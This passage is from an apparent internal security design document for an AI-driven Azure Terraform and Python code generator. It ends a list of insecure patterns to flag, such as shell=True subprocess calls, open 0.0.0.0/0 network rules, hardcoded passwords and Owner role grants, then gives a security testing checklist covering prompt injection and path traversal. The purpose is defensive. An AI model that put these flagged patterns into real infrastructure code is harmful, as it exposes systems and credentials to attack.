- `subprocess.run(..., shell=True)` - Shell injection risk

**Terraform:**
- `source_address_prefix = "0.0.0.0/0"` - Unrestricted internet access
- `admin_password = "..."` - Hardcoded password
- `azurerm_role_assignment` with `role_definition_name = "Owner"` - Excessive privileges

---

## Appendix B: Security Testing Checklist

- [ ] **Input Validation Tests**
  - [ ] Reject AWS/GCP objectives
  - [ ] Reject destructive operations
  - [ ] Accept valid Azure objectives
  - [ ] Enforce size limits
  - [ ] Sanitize dangerous inputs

- [ ] **Code Validation Tests**
  - [ ] Detect public IP exposure in Terraform
  - [ ] Detect hardcoded passwords
  - [ ] Detect dangerous shell commands
  - [ ] Detect dangerous Python imports
  - [ ] Validate generated code passes security scans

- [ ] **Credential Security Tests**
  - [ ] No credentials in logs
  - [ ] Audit log entries created for all operations
  - [ ] Credential sanitization working
  - [ ] Azure CLI delegation working

- [ ] **File Security Tests**
  - [ ] Path traversal blocked
  - [ ] Sensitive files have 0600 permissions
  - [ ] Temp files cleaned up
  - [ ] File operations within allowed directories

- [ ] **Rate Limiting Tests**
  - [ ] Azure API rate limiting working
  - [ ] Claude API rate limiting working
  - [ ] Burst capacity handled correctly

- [ ] **Penetration Tests**
  - [ ] Prompt injection attempts blocked
  - [ ] Path traversal attempts blocked
  - [ ] Malicious code generation blocked
  - [ ] API abuse attempts throttled
  - [ ] Credential leakage attempts sanitized

---

**Document Control**

- **Author**: Security Team
- **Reviewers**: Engineering, DevOps, Compliance
- **Approvers**: CTO, CISO
- **Last Updated**: 2025-10-20
- **Next Review**: 2025-11-20
